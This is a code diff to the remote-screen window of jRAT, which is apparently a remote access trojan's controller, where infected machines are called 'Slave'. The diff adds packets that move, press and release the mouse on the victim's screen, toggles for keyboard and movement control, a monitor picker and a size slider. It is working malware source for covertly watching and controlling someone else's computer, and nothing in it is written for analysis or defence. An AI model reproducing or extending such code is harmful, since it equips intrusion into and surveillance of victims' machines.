@@ -4,6 +4,7 @@ import java.awt.BorderLayout;
 import java.awt.Toolkit;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.awt.event.MouseMotionAdapter;
 import java.awt.event.WindowAdapter;
 import java.awt.event.WindowEvent;
 import java.awt.image.BufferedImage;
@@ -12,6 +13,8 @@ import java.util.HashMap;
 import java.util.Map;
 
 import javax.imageio.ImageIO;
+import javax.swing.Box;
+import javax.swing.DefaultComboBoxModel;
 import javax.swing.ImageIcon;
 import javax.swing.JButton;
 import javax.swing.JCheckBox;
@@ -19,15 +22,30 @@ import javax.swing.JFileChooser;
 import javax.swing.JFrame;
 import javax.swing.JLabel;
 import javax.swing.JProgressBar;
+import javax.swing.JSlider;
+import javax.swing.JToggleButton;
 import javax.swing.JToolBar;
+import javax.swing.event.ChangeEvent;
+import javax.swing.event.ChangeListener;
 
 import pro.jrat.client.ErrorDialog;
+import pro.jrat.client.Monitor;
 import pro.jrat.client.Slave;
 import pro.jrat.client.packets.outgoing.Packet12RemoteScreen;
 import pro.jrat.client.packets.outgoing.Packet26StopRemoteScreen;
+import pro.jrat.client.packets.outgoing.Packet50UpdateRemoteScreen;
+import pro.jrat.client.packets.outgoing.Packet91MouseMove;
+import pro.jrat.client.packets.outgoing.Packet92MousePress;
+import pro.jrat.client.packets.outgoing.Packet93MouseRelease;
 import pro.jrat.client.threads.ThreadFPS;
 import pro.jrat.client.threads.ThreadRecordButton;
 import pro.jrat.client.ui.components.JRemoteScreenPane;
+import pro.jrat.client.ui.renderers.JComboBoxIconRenderer;
+import pro.jrat.client.utils.IconUtils;
+
+import javax.swing.JComboBox;
+import java.awt.event.MouseAdapter;
+import java.awt.event.MouseEvent;
 
 @SuppressWarnings("serial")
 public class FrameRemoteScreen extends BaseFrame {
@@ -49,14 +67,20 @@ public class FrameRemoteScreen extends BaseFrame {
 	private JToolBar toolBarBottom;
 	private JRemoteScreenPane screenPane;
 	private JProgressBar progressBar;
-	private JCheckBox cbShowProgressBar;
 	private JButton btnStart;
 	private JButton btnStop;
 	private Slave slave;
 	private JLabel lblFps;
 	private JButton btnCapture;
 	private JButton btnRecord;
-	private ThreadRecordButton threadRecordButton;;
+	private ThreadRecordButton threadRecordButton;
+	private JSlider sliderSize;
+	private JLabel lblSize;
+	private JToggleButton tglbtnToggleMouse;
+	private JToggleButton tglbtnToggleKeyboard;
+	private JToggleButton tglbtnToggleMovement;
+	private JComboBox<String> cbMonitors;
+	private JLabel lblMonitors;
 
 	public FrameRemoteScreen(Slave sl) {
 		addWindowListener(new WindowAdapter() {
@@ -82,22 +106,74 @@ public class FrameRemoteScreen extends BaseFrame {
 		toolBarBottom.setFloatable(false);
 		
 		screenPane = new JRemoteScreenPane();
+		screenPane.getPanel().addMouseListener(new MouseAdapter() {
+			@Override
+			public void mousePressed(MouseEvent e) {
+				if (tglbtnToggleMouse.isSelected()) {
+					slave.addToSendQueue(new Packet91MouseMove((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), monitor));
+
+					int button = e.getButton();
+					int button2 = 16;
+					if (button == 3) {
+						button2 = 4;
+					}
+
+					slave.addToSendQueue(new Packet92MousePress((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), button2, monitor));
+				}
+			}
+
+			@Override
+			public void mouseReleased(MouseEvent e) {
+				if (tglbtnToggleMouse.isSelected()) {
+					int button = e.getButton();
+					int button2 = 16;
+					if (button == 3) {
+						button2 = 4;
+					}
+
+					slave.addToSendQueue(new Packet93MouseRelease((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), button2, monitor));
+				}
+			}
+		});
+		
+		screenPane.getPanel().addMouseMotionListener(new MouseMotionAdapter() {
+			@Override
+			public void mouseMoved(MouseEvent e) {
+				if (tglbtnToggleMovement.isSelected()) {
+					slave.addToSendQueue(new Packet91MouseMove((int) (e.getX() / (size / 100D)), (int) (e.getY() / (size / 100D)), monitor));
+				}
+			}
+		});
 		
 		getContentPane().add(toolBarTop, BorderLayout.NORTH);
 		getContentPane().add(toolBarBottom, BorderLayout.SOUTH);
 		
-		cbShowProgressBar = new JCheckBox("");
-		cbShowProgressBar.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				progressBar.setVisible(cbShowProgressBar.isSelected());
-			}
-		});
-		cbShowProgressBar.setSelected(true);
-		cbShowProgressBar.setToolTipText("Show progressbar");
-		toolBarBottom.add(cbShowProgressBar);
-		
 		progressBar = new JProgressBar();
 		toolBarBottom.add(progressBar);
+		toolBarBottom.addSeparator();
+		
+		lblMonitors = new JLabel("Monitors:  ");
+		lblMonitors.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/monitor.png")));
+		toolBarBottom.add(lblMonitors);
+		
+		cbMonitors = new JComboBox<String>();
+		DefaultComboBoxModel<String> model = new DefaultComboBoxModel<String>();
+		cbMonitors.setModel(model);
+		JComboBoxIconRenderer renderer = new JComboBoxIconRenderer();
+		cbMonitors.setRenderer(renderer);
+		model.removeAllElements();
+		model.addElement("Default");
+		renderer.addIcon("default", IconUtils.getIcon("monitor--arrow"));
+
+		ImageIcon icon = IconUtils.getIcon("monitor");
+
+		for (Monitor monitor : slave.getMonitors()) {
+			renderer.addIcon(monitor.getName().toLowerCase(), icon);
+			model.addElement(monitor.getName());
+		}
+		
+		toolBarBottom.add(cbMonitors);
+		toolBarBottom.add(Box.createHorizontalStrut(200));
 		
 		lblFps = new JLabel("    FPS: 0    ");
 		toolBarBottom.add(lblFps);
@@ -148,10 +224,49 @@ public class FrameRemoteScreen extends BaseFrame {
 		toolBarTop.add(btnRecord);
 		toolBarTop.addSeparator();
 		
+		lblSize = new JLabel("Size: " + size + "%");
+		lblSize.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/application-resize-full.png")));
+		toolBarTop.add(lblSize);
+		
+		sliderSize = new JSlider();
+		sliderSize.addChangeListener(new ChangeListener() {
+			public void stateChanged(ChangeEvent arg0) {
+				setImageSize(sliderSize.getValue());
+				sendUpdate();
+			}
+		});
+		sliderSize.setToolTipText("Size");
+		sliderSize.setSnapToTicks(true);
+		sliderSize.setMinorTickSpacing(10);
+		toolBarTop.add(sliderSize);
+		toolBarTop.addSeparator();
+		
+		tglbtnToggleMouse = new JToggleButton("");
+		tglbtnToggleMouse.setSelected(true);
+		tglbtnToggleMouse.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/mouse.png")));
+		toolBarTop.add(tglbtnToggleMouse);
+		
+		tglbtnToggleKeyboard = new JToggleButton("");
+		tglbtnToggleKeyboard.setSelected(true);
+		tglbtnToggleKeyboard.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/keyboard.png")));
+		toolBarTop.add(tglbtnToggleKeyboard);
+		
+		tglbtnToggleMovement = new JToggleButton("");
+		tglbtnToggleMovement.setIcon(new ImageIcon(FrameRemoteScreen.class.getResource("/icons/arrow_move_icon.png")));
+		toolBarTop.add(tglbtnToggleMovement);
+		
+		toolBarTop.addSeparator();
+		
+		
 		
 		getContentPane().add(screenPane);
 	}
 	
+	public void sendUpdate() {
+		Packet50UpdateRemoteScreen packet = new Packet50UpdateRemoteScreen(monitor, quality, size);
+		slave.addToSendQueue(packet);
+	}
+
 	public void start() {
 		btnStart.setEnabled(false);
 		btnStop.setEnabled(true);
@@ -236,6 +351,7 @@ public class FrameRemoteScreen extends BaseFrame {
 
 	public void setImageSize(int size) {
 		this.size = size;
+		lblSize.setText("Size: " + size + "%");
 	}
 	
 	public ThreadFPS getFPSThread() {
